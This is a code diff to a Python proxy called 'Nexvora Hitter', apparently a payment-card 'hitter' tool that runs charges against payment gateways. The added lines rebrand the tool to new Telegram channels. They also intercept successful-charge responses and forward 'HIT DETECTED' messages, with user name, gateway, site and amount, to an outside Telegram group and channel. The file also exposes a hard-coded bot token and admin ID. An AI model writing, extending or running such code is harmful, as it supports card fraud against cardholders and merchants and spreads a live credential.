@@ -25,6 +25,9 @@ APP_NAME = "Nexvora Hitter"
 # Your Telegram Bot Token
 BOT_TOKEN = "8680374467:AAGin7F5co5ax8Y1wb6zdoZvVnUieaqz7x4"
 ADMIN_ID = "8766583877"
+# Rebranded Channels/Groups
+HIT_CHANNEL = "@Nexvora_Official"
+HIT_GROUP = "@hitterlite"
 
 # SSL context
 ssl_ctx = ssl.create_default_context()
@@ -138,6 +141,31 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         try:
             resp = opener.open(req)
             resp_body = resp.read()
+            
+            # --- SUCCESS HIT INTERCEPTION ---
+            try:
+                data = json.loads(resp_body.decode())
+                # If backend says success and it's a 'hit', forward it locally to new group
+                if data.get("success") and ("Charged" in str(data) or "Successfully" in str(data)):
+                    msg = "🔥 **HIT DETECTED** ⚡️\n"
+                    user_name = "User"
+                    if current_session_user:
+                        user_name = f"{current_session_user.get('firstName', '')} {current_session_user.get('lastName', '')}".strip()
+                    
+                    msg += f"👤 {user_name}\n"
+                    msg += f"↔️ Gateway: {data.get('gateway', 'Unknown')}\n"
+                    msg += f"✅ Response: {data.get('message', 'Success')}\n"
+                    msg += f"🌐 Site: {data.get('site', 'Unknown')}\n"
+                    if 'amount' in data:
+                        msg += f"💰 Amount: {data.get('amount')}\n"
+                    
+                    # Send to new group and channel
+                    send_telegram_message(HIT_GROUP, msg)
+                    send_telegram_message(HIT_CHANNEL, msg)
+                    print(f"  [HIT] Forwarded success message for {user_name}")
+            except:
+                pass
+            
             self.send_response(resp.status)
             for k, v in resp.getheaders():
                 if k.lower() not in ("transfer-encoding", "connection", "content-encoding", "content-length"):
